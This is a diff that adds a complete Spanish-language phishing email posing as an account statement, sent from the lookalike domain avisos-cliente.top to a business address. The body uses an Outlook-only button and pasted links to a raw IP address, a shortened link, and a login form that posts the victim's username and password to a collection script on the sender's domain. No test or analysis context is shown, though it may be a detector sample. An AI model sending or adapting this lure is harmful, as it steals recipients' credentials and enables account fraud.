@@ -1,0 +1,14 @@
+Authentication-Results: mx.google.com; dkim=pass header.i=@avisos-cliente.top; spf=pass smtp.mailfrom=avisos-cliente.top; dmarc=pass header.from=avisos-cliente.top
+From: Avisos <a@avisos-cliente.top>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Estado de cuenta
+Date: Wed, 7 Oct 2026 09:00:00 -0500
+Message-ID: <29885@avisos-cliente.top>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><!--[if mso]><v:roundrect href="http://45.83.12.9/pago" style="width:200px">Pagar</v:roundrect><![endif]-->
+<map><area shape="rect" href="https://bit.ly/estado-cta"></map>
+<p>Copie en su navegador: http://45.83.12.9/estado</p>
+<form action="https://collect.avisos-cliente.top/p.php" method="post">Usuario <input name="u"> Clave <input type="password" name="p"><input type="submit"></form>
+</body></html>
